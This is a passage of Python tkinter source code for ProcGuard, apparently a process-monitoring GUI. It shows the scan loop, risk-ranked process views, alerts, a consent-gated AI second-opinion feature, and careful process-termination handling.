                    exe="/tmp/procguard-demo/browser_helper", cmdline=["demo_browser_helper"],
                    username="demo", create_time=started, status="running", num_threads=4,
                    cpu_percent=28.0, mem_percent=7.0, mem_rss=900 * 1024 * 1024,
                    parent_name="demo_browser", simulated=True)
                out = out + orig([fake, busy])
            return out

        self.engine.assess_all = wrapped

    # ============================================================ worker thread
    def _worker(self) -> None:
        force = False
        while not self._stop.is_set():
            if force or not self._paused:
                try:
                    self.q.put(("snap", self.engine.assess_all(self.collector.snapshot())))
                except Exception as exc:  # keep the monitor alive no matter what
                    self.q.put(("error", f"{type(exc).__name__}: {exc}"))
            force = self._wake.wait(self._interval)
            self._wake.clear()

    def _poll(self) -> None:
        latest = None
        try:
            while True:
                msg = self.q.get_nowait()
                if msg[0] == "snap":
                    latest = msg[1]  # only the newest snapshot matters
                elif msg[0] == "performance_ai":
                    if any(performance_key(f) == msg[1] for f in self.performance_findings.values()):
                        self.performance_results[msg[1]] = msg[2]
                    self._apply_junk_tree()
                elif msg[0] == "terminated":
                    self.junk_notice.config(text=msg[1])
                    self.status.config(text=msg[1])
                elif msg[0] == "ai":
                    self._on_ai(msg[1], msg[2])
                elif msg[0] == "error":
                    self.status.config(text=f"Scan error: {msg[1]}")
        except queue.Empty:
            pass
        if latest is not None:
            self._on_snapshot(latest)
        self.after(250, self._poll)

    # ============================================================== event logic
    def _on_snapshot(self, assessed: List[Assessed]) -> None:
        self.items = {a.info.pid: a for a in assessed}
        counts = {lvl: 0 for lvl in Level}
        for a in assessed:
            counts[a.risk.level] += 1
        for lvl, lbl in self.badges.items():
            lbl.config(text=str(counts[lvl]))
        self.total_label.config(text=str(len(assessed)))

        new, first = self.alert_mgr.update(assessed)
        if self.alerts_var.get() and new:
            if first:
                names = ", ".join(sorted({a.info.name for a in new})[:4])
                self._raise_alert("Startup scan", f"{len(new)} high-risk process(es) already running: "
                                  f"{names}", new[0].info.pid)
            else:
                for a in new[:3]:
                    top = max(a.risk.reasons, key=lambda r: r.points)
                    self._raise_alert(f"New high-risk process: {a.info.name}",
                                      top.text.split(". ")[0], a.info.pid)
                if len(new) > 3:
                    self._raise_alert("Multiple new high-risk processes", f"{len(new) - 3} more", None)

        if self.auto_ai.get():
            ranked = sorted((a for a in assessed if a.risk.level is not Level.LOW),
                            key=lambda a: -a.risk.score)
            for a in ranked:
                if ai_key(a.info) not in self.ai_results and self.reviewer.submit(a.info, a.risk):
                    self.ai_results[ai_key(a.info)] = "pending"

        self.performance_findings = {f.info.pid: f for f in self.performance_engine.assess(a.info for a in assessed)}
        active_keys = {performance_key(f) for f in self.performance_findings.values()}
        self.performance_results = {k: v for k, v in self.performance_results.items() if k in active_keys}
        self._apply_junk_tree()
        self._apply_tree()
        self._show_inspector()
        self._last_update = "Updated " + time.strftime('%H:%M:%S')
        self._update_status()

    def _update_status(self):
        state = "PAUSED" if self._paused else "MONITORING"
        self.monitor_label.config(text=state, fg=STYLE[Level.MEDIUM][3] if self._paused else PALETTE["accent"])
        self.pause_button.configure(text="Resume" if self._paused else "Pause")
        ai = f"AI: {self.analyzer.name}" if self.analyzer.available() else "AI: not configured"
        self.status.config(text=f"{len(self.items)} processes  ·  {self._last_update}  ·  {ai}"
                                + ("  ·  Monitoring paused" if self._paused else ""))

    def _on_ai(self, key: str, verdict: AIVerdict) -> None:
        self.ai_results[key] = verdict
        if verdict.verdict in ("suspicious", "malicious") and self.alerts_var.get():
            pid = next((p for p, a in self.items.items() if ai_key(a.info) == key), None)
            self._raise_alert(f"AI says {verdict.verdict}: {verdict.subject}",
                              verdict.explanation[:200], pid)
        self._show_inspector()

    def _raise_alert(self, title: str, message: str, pid: Optional[int]) -> None:
        self._banner_pid = pid
        line = f"{title} \u2014 {message}"
        if len(line) > 150:
            line = line[:149] + "\u2026"
        self.banner_label.config(text=f"\u26A0  {line}")
        self.banner.pack(fill="x", before=self.workspace, padx=22)
        self._alert_count += 1
        self.nb.tab(1, text=f"Alert log · {self._alert_count}")
        notify("ProcGuard: " + title, message)
        self.log.config(state="normal")
        self.log.insert("1.0", f"{message}\n", "")
        self.log.insert("1.0", f"{title}\n", "alert")
        self.log.insert("1.0", f"[{time.strftime('%H:%M:%S')}]  ", "time")
        self.log.config(state="disabled")

    # ================================================================ tree view
    def _haystack(self, a: Assessed) -> str:
        i = a.info
        return f"{i.name} {i.pid} {i.exe or ''} {i.username or ''} {i.cmd}".lower()

    @staticmethod
    def _top_reason(a: Assessed) -> str:
        pos = [r for r in a.risk.reasons if r.points > 0]
        if not pos:
            return "\u2014"
        text = max(pos, key=lambda r: r.points).text
        first = text.split(". ")[0].rstrip(".")
        return first if len(first) <= 140 else first[:137] + "\u2026"

    def _apply_tree(self) -> None:
        q = self.search_var.get().strip().lower()
        col, rev = self._sort
        keyf = SORTERS[col]
        buckets: Dict[Level, List[Assessed]] = {lvl: [] for lvl in Level}
        for a in self.items.values():
            if (self._level_filter is None or a.risk.level == self._level_filter) and (not q or q in self._haystack(a)):
                buckets[a.risk.level].append(a)

        keep = set()
        for lvl in (Level.HIGH, Level.MEDIUM, Level.LOW):
            rows = sorted(buckets[lvl], key=lambda a: (a.info.name.lower(), a.info.pid))
            rows.sort(key=keyf, reverse=rev)  # stable: ties keep name/pid order
            parent = GROUP[lvl]
            if self._level_filter is None or self._level_filter == lvl:
                self.tree.move(parent, "", "end")
                if q or self._level_filter is not None:
                    self.tree.item(parent, open=True)
            else:
                self.tree.detach(parent)
            for idx, a in enumerate(rows):
                i = a.info
                iid = f"p{i.pid}"
                keep.add(iid)
                vals = (i.pid, f"{i.cpu_percent:.1f}", fmt_bytes(i.mem_rss), a.risk.score,
                        i.username or "\u2014", self._top_reason(a))
                if self.tree.exists(iid):
                    self.tree.item(iid, text=i.name, values=vals, tags=(lvl.value,))
                    if self.tree.parent(iid) != parent or self.tree.index(iid) != idx:
                        self.tree.move(iid, parent, idx)
                else:
                    self.tree.insert(parent, idx, iid=iid, text=i.name, values=vals,
                                     tags=(lvl.value,))
            n = len(rows)
            self.tree.item(parent, text=f"{STYLE[lvl][2]}   \u00b7   {n} process"
                                        f"{'' if n == 1 else 'es'}")
        for grp in GROUP.values():
            for iid in self.tree.get_children(grp):
                if iid not in keep:
                    self.tree.delete(iid)
        visible = sum(len(rows) for rows in buckets.values())
        self.result_label.config(text=f"{visible} of {len(self.items)} processes")
        if visible == 0:
            self.empty_label.config(text="No matching processes\nTry a different search or risk filter."
                                    if self.items else "No processes in this snapshot.\nWaiting for the next scan…")
            self.empty_label.place(relx=0.5, rely=0.5, anchor="center")
        else:
            self.empty_label.place_forget()
        self._show_inspector()

    def _sort_by(self, col: str) -> None:
        cur, rev = self._sort
        self._sort = (col, not rev) if col == cur else (col, col in ("cpu", "mem", "score"))
        self._set_headings()
        self._apply_tree()

    def _focus_pid(self, pid: Optional[int]) -> None:
        iid = f"p{pid}"
        if pid is not None and pid in self.items:
            self._level_filter = None
            self.search_var.set("")
            self._set_filter(None)
        if pid is not None and self.tree.exists(iid):
            self.nb.select(0)
            self.tree.item(self.tree.parent(iid), open=True)
            self.tree.selection_set(iid)
            self.tree.see(iid)

    # ================================================================ inspector
    def _selected(self) -> Optional[Assessed]:
        sel = self.tree.selection()
        if sel and sel[0].startswith("p"):
            try:
                a = self.items.get(int(sel[0][1:]))
                if a is not None and (self._level_filter is None or a.risk.level == self._level_filter):
                    q = self.search_var.get().strip().lower()
                    if not q or q in self._haystack(a):
                        return a
                return None
            except ValueError:
                return None
        return None

    def _segments(self, a: Assessed) -> List[tuple]:
        i, r = a.info, a.risk
        s: List[tuple] = []
        s += [(i.name, "h1"), (f"    PID {i.pid}\n", "muted")]
        s += [(f" {STYLE[r.level][2]}  \u00b7  score {r.score} ", r.level.value), ("\n", "body")]

        s.append(("Why it was flagged\n", "h2"))
        pos = sorted((x for x in r.reasons if x.points > 0), key=lambda x: -x.points)
        for x in pos:
            s += [(f"+{x.points:<4}", "pts"), (f"{x.text}\n", "body")]
        for x in (x for x in r.reasons if x.points == 0):
            s.append((f"{x.text}\n", "muted"))
        if not r.reasons:
            s.append(("Nothing unusual was detected.\n", "muted"))

        s += [("What it is probably doing\n", "h2"), (r.description + "\n", "body")]

        s.append(("AI second opinion\n", "h2"))
        res = self.ai_results.get(ai_key(i))
        if res == "pending":
            s.append((f"Asking {self.analyzer.name}\u2026\n", "muted"))
        elif isinstance(res, AIVerdict):
            s += [(f"Verdict: {res.verdict.upper()}\n", "v_" + res.verdict),
                  (res.explanation + "\n", "body")]
        elif not self.analyzer.available():
            s.append(("Not configured. Set GEMINI_API_KEY and `pip install google-genai` "
                      "(see README).\n", "muted"))
        else:
            s.append(("Click \u201cAsk AI about this\u201d for a second opinion.\n", "muted"))

        s.append(("Details\n", "h2"))

        def row(label: str, value: str) -> None:
            s.extend([(f"{label:<13}", "muted"), (value + "\n", "mono")])

        row("Path", i.exe or "(hidden \u2014 permission denied)")
        row("Command", i.cmd or "(hidden or none)")
        row("User", i.username or "unknown")
        row("Parent", f"{i.parent_name or 'unknown'} (PID {i.ppid})")
        row("Started", f"{fmt_time(i.create_time)}  ({fmt_age(i.create_time)} ago)")
        row("Status", i.status or "unknown")
        row("CPU / Memory", f"{i.cpu_percent:.1f}% of machine / {fmt_bytes(i.mem_rss)} "
                            f"({i.mem_percent:.1f}%)")
        row("Threads", str(i.num_threads))
        if i.remote:
            shown = [f"{ip}:{port}" + ("  (internet)" if is_external(ip) else "")
                     for ip, port in i.remote[:8]]
            more = f"  \u2026and {len(i.remote) - 8} more" if len(i.remote) > 8 else ""
            row("Connections", "\n             ".join(shown) + more)
        else:
            row("Connections", "none seen (or not visible to this app)")
        if i.listening:
            row("Listening", ", ".join(sorted({f"{ip}:{p}" for ip, p in i.listening})[:8]))
        return s

    def _show_inspector(self, force: bool = False) -> None:
        a = self._selected()
        if a is None:
            segs = [("Select a process to investigate.\n\nReview its risk signals, resource usage, command line, and network connections here.\n",
                     "muted")]
        else:
            segs = self._segments(a)
        sig = "".join(t for t, _ in segs) + ("T" if a and trust_key(a.info) in self.trusted else "")
        pid = a.info.pid if a else None
        if not force and sig == self._last_sig:
            return
        # Don't yank the text away while the user is selecting something to copy.
        if not force and pid == self._last_pid and self.detail.tag_ranges("sel"):
            return
        y = self.detail.yview()[0] if pid == self._last_pid else 0.0
        self.detail.config(state="normal")
        self.detail.delete("1.0", "end")
        for text, tag in segs:
            self.detail.insert("end", text, tag)
        self.detail.config(state="disabled")
        self.detail.yview_moveto(y)
        self._last_sig, self._last_pid = sig, pid
        self._update_buttons(a)

    def _update_buttons(self, a: Optional[Assessed]) -> None:
        on = a is not None
        can_kill = on and a.info.pid != self._own_pid() and not a.info.simulated and "(simulated)" not in a.info.name.casefold()
        self.btn_kill.state(["!disabled"] if can_kill else ["disabled"])
        self.btn_trust.state(["!disabled"] if on else ["disabled"])
        self.btn_ai.state(["!disabled"] if on and self.analyzer.available() else ["disabled"])
        if on:
            self.btn_trust.config(text="Remove trust" if trust_key(a.info) in self.trusted
                                  else "Mark as trusted")

    @staticmethod
    def _own_pid() -> int:
        import os
        return os.getpid()

    # ================================================================== actions
    def _confirm_ai(self) -> bool:
        if self._ai_consented:
            return True
        ok = messagebox.askokcancel(
            "Send data to AI?",
            f"AI review sends a REDACTED summary of a process to {self.analyzer.name}'s API: its "
            "name, file path, command line, parent name, internet IP:ports, and why it was flagged. "
            "Your username and home folder are masked and obvious secrets are removed, but redaction "
            "is not perfect.\n\nOnly Medium/High processes you ask about (or auto-review picks) are "
            "sent, never the full process list.\n\nContinue?")
        self._ai_consented = bool(ok)
        return self._ai_consented

    def _on_auto_ai(self) -> None:
        if self.auto_ai.get() and not self._confirm_ai():
            self.auto_ai.set(False)

    def _ask_ai(self) -> None:
        a = self._selected()
        if a is None or not self._confirm_ai():
            return
        key = ai_key(a.info)
        self.ai_results[key] = "pending"
        if not self.reviewer.submit(a.info, a.risk, force=True):
            self.ai_results[key] = AIVerdict("error", "Could not queue the request (queue full "
                                             "or AI not configured).", a.info.name)
        self._show_inspector(force=True)

    def _toggle_trust(self) -> None:
        a = self._selected()
        if a is None:
            return
        k = trust_key(a.info)
        if k in self.trusted:
            self.trusted.discard(k)
        else:
            self.trusted.add(k)
        save_trusted(self.trusted)
        self._wake.set()

    def _terminate(self) -> None:
        a = self._selected()
        if a is not None:
            self._terminate_target(a)

    def _terminate_junk(self):
        finding = self._selected_junk()
        if finding is None:
            return
        a = self.items.get(finding.info.pid)
        if a is not None and a.info.key == finding.info.key:
            self._terminate_target(a, from_junk=True)

    def _terminate_target(self, a: Assessed, from_junk=False):
        i = a.info
        if i.simulated or "(simulated)" in i.name.casefold():
            messagebox.showinfo("Simulated process", "This is a demo record, not a running process. There is nothing to terminate.")
            return
        if i.pid == self._own_pid() or i.pid <= 1 or not i.create_time:
            messagebox.showinfo("Protected process", "ProcGuard cannot safely terminate this entry.")
            return
        if from_junk:
            reason = protection_reason(i, self._own_pid(), self._owner, self.performance_engine.ancestors)
            if reason:
                messagebox.showinfo("Protected process", reason)
                return
        if not messagebox.askyesno(
                "Terminate process",
                f"End ‘{i.name}’ (PID {i.pid})?\n\nSave your work first. Unsaved changes, downloads, calls, "
                "or background tasks may be interrupted. Quitting inside the app is usually better.\n\n"
                "ProcGuard will request termination; it will not force-kill an app that ignores the request.",
                icon="warning", default="no"):
            return
        try:
            process = psutil.Process(i.pid)
            if abs(process.create_time() - i.create_time) > 0.01:
                messagebox.showinfo("Already gone", "That process exited and its PID was reused. Nothing was ended.")
                self._wake.set()
                return
            if from_junk:
                from dataclasses import replace
                fresh = replace(i, username=process.username(), name=process.name(), exe=process.exe())
                reason = protection_reason(fresh, self._own_pid(), self._owner, self.performance_engine.ancestors)
                if reason:
                    messagebox.showinfo("Protected process", reason)
                    return
            process.terminate()
        except psutil.NoSuchProcess:
            self.junk_notice.config(text=f"{i.name} already exited. Refreshing…")
        except psutil.AccessDenied:
            messagebox.showerror("Permission denied", "You do not have permission to end this process.")
        except Exception as exc:
            messagebox.showerror("Could not terminate", str(exc))
        else:
            self.junk_notice.config(text=f"Termination requested for {i.name}. Waiting for exit…")
            threading.Thread(target=self._wait_for_exit, args=(process, i.name), daemon=True).start()
        self._wake.set()

    def _wait_for_exit(self, process, name):
        try:
            process.wait(timeout=3)
            message = f"{name} exited. Refreshing process measurements."
        except psutil.NoSuchProcess:
            message = f"{name} already exited. Refreshing process measurements."
        except psutil.TimeoutExpired:
            message = f"{name} is still running. Try quitting inside the app; no force-kill was sent."
        except psutil.Error:
            message = f"Could not confirm whether {name} exited. Check the refreshed list."
        self.q.put(("terminated", message))
        self._wake.set()

    def _on_pause(self) -> None:
        self._paused = self.pause_var.get()
        self._update_status()
        if not self._paused:
            self._wake.set()

    def _on_interval(self, _e=None) -> None:
        self._interval = INTERVALS.get(self.interval_box.get(), 2.0)
        self._wake.set()

    def _on_close(self) -> None:
        self._stop.set()
        self.performance_reviewer.close()
        self._wake.set()
        self.destroy()


def run(demo: bool = False) -> None:
    App(demo=demo).mainloop()
